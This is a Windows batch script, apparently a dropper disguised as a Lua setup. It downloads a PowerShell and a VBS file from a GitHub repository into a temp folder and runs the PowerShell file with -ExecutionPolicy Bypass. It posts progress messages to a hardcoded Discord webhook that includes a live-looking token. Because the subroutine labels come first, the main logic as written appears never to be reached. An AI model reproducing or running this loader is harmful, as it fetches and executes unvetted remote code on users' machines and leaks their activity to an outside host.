@echo off
setlocal

REM Define URLs and paths
set "strWinURL=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/win.vbs"
set "strPs1URL=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/setup-lua.ps1"
set "strRootPath=%TEMP%\ZZ\"
set "strPs1Path=%strRootPath%setup-lua.ps1"
set "strWinPath=%strRootPath%win.vbs"
set "strWebhookURL=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
set "intWait=5000"

REM Function to send output to Discord using curl
:SendToDiscord
setlocal
set "message=%~1"
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %strWebhookURL%
endlocal
goto :eof

REM Function to download files using curl
:DownloadFile
setlocal
set "url=%~1"
set "localFile=%~2"
curl -L -o "%localFile%" "%url%"
call :SendToDiscord "Downloaded: %url%"
endlocal
goto :eof

REM Create root folder if it doesn't exist
if not exist "%strRootPath%" (
    mkdir "%strRootPath%"
    call :SendToDiscord "Created root folder: %strRootPath%"
)

REM Download PowerShell script if it does not exist
call :SendToDiscord "Starting download of PowerShell script..."
if not exist "%strPs1Path%" call :DownloadFile "%strPs1URL%" "%strPs1Path%"

REM Download VBS script if it does not exist
call :SendToDiscord "Starting download of VBS script..."
if not exist "%strWinPath%" call :DownloadFile "%strWinURL%" "%strWinPath%"

REM Wait for a few seconds
call :SendToDiscord "Download completed. Waiting for 5 seconds..."
timeout /t 5 /nobreak >nul

REM Execute the PowerShell script
if exist "%strPs1Path%" (
    call :SendToDiscord "Executing PowerShell script..."
    start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%strPs1Path%"
    call :SendToDiscord "Executed: %strPs1Path%"
)

endlocal
